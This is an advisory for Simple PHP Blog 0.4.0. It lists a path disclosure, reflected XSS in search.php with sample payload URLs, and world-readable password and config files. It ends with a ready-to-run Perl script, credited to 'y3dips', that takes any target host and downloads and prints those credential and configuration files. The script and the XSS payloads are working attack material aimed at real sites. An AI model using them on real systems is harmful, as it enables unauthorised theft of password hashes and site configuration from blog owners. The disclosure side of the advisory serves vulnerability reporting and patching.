Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Simple PHP blog (sphpblog)

version: 0.4.0
lisensi: GPL - <http://www.gnu.org/licenses/licenses.html#GPL>
url : <http://sourceforge.net/projects/sphpblog/>
Author: Alexander Palmo (apalmo <at> bigevilbrain <dot> com)
Description: simple Blog without databases needed

---------------------------------------------------------------------------

Vulnerabilities:
~~~~~~~~~~~~~~~~

A. Full Path disclosures

http://[Url]/sphpblog/scripts/sb_functions.php

Ex :

Warning: main(scripts/sb_fileio.php): failed to open stream: No such file or directory in
/var/www/sphpblog/scripts/sb_functions.php on line 52

Fatal error: main(): Failed opening required 'scripts/sb_fileio.php'
(include_path='.:/usr/share/pear') in
/var/www/sphpblog/scripts/sb_functions.php on line 52

B. XSS in search.php

<http://Url/sphpblog/search.php?q=>[XSS]

http://[Url]/sphpblog/search.php?q=%3Cmarquee%3Ewe+are+a+like%3C%2Fmarquee%3E
http://[URl]/sphpblog/search.php?q=<a href=<http://echo.or.id>>echo</a>

C. Critical Information dislosures

Critical file (password and config file) are vulnerable to direct access
to view 'critical' information about the blog and the user.

Password file are using PHP`s crypt() function

http://[Url]/sphpblog/config/password.txt
http://[Url]/sphpblog/config/config.txt

---------------------------------------------------------------------------

Script:
~~~~~~~

#!/usr/bin/perl -w

# Remote grabbing  sphpblog password & config file by y3dips
# Bug find by y3dips <http:// y3dips echo or id>
# Bug published at <http://echo.or.id/adv/adv12-y3dips-2005.txt>

print "\n* Remote grabbing  sphpblog password & config file by y3dips  *\n";
require LWP::UserAgent;

if(@ARGV == 1)
	{

$target= $ARGV[0];

my $ua = LWP::UserAgent->new;
$ua->agent("MSIE/6.0 Windows");
$ua->timeout(10);
$ua->env_proxy;

my @url = ("http://$target/config/password.txt", " http://$target/config/config.txt");

foreach my $urlz (@url) {
            my $injek = $ua->get($urlz);
	    print "\n-------------------------------\n";
            if ($injek->is_success)
                 {   print $injek->content;}
            else
                 {die $injek->status_line;}
	    print "\n-------------------------------\n";

}
}
else {
print "Use: perl $0 [[www.target.com](http://www.target.com)] \n";
